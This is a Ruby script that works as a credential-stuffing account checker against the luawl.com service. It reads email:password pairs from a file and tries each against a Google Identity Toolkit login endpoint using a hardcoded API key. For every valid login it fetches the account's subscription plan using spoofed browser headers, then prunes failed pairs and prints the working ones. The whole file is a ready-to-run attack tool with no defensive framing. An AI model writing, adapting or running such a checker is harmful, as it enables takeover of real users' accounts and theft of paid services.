require 'concurrent'
require 'http'
require 'json'

API_KEY = "AIzaSyCio3wiwvwX1bkk5lSNXMnT6maKMPkfgrQ"

# Cache to store the results of HTTP requests
@cache = {}

def get_token(uemail, upass, key)
  # Check the cache first
  cache_key = uemail + '-' + upass
  if @cache.key?(cache_key)
    return @cache[cache_key]
  end

  # Make an HTTP request
  uri = URI("https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=" + key)
  response = HTTP.post(uri, json: {
    returnSecureToken: true,
    email: uemail,
    password: upass,
  })

  json = JSON.parse(response.body)
  token = json["idToken"]

  # Update the cache
  @cache[cache_key] = token

  token
end

def get_plan(token)
  # Check the cache first
  if @cache.key?(token)
    return @cache[token]
  end

  # Make an HTTP request
  uri = URI("https://api2.luawl.com/validateLoginFB.php")
  response = HTTP.post(uri, headers: {
    "Authorization" => "Bearer " + token,
    "Origin" => "https://dashboard.luawl.com",
    "Sec-Fetch-Site" => "same-site",
    "Sec-Fetch-Mode" => "cors",
    "Sec-Fetch-Dest" => "empty",
    "Host" => "api2.luawl.com",
    "Content-Type" => "application/json",
    "Referer" => "https://dashboard.luawl.com/",
  })

  json = JSON.parse(response.body)
  plan = json["data"][0]["plan_name"]

  # Update the cache
  @cache[token] = plan

  plan
end

def get_tokens_from_file(file, key)
  # Read the entire file into memory
  lines = File.readlines(file)

  # Make HTTP requests in parallel
  results = Concurrent::Promise.zip(*lines.map do |line|
    Concurrent::Promise.execute do
      email, pass = line.split(":")
      token = get_token(email, pass, key)
      if token.nil?
        lines.reject! { |l| l.include?(line) }
      else
        plan = get_plan(token)
        "\e[32m" + line + "\e[0m" + " - " + plan
      end
    end
  end).value

  # Write the updated lines to the file
  File.write(file, lines.join)

  # Print the results
  puts results.compact
end

get_tokens_from_file("pass.txt", API_KEY)
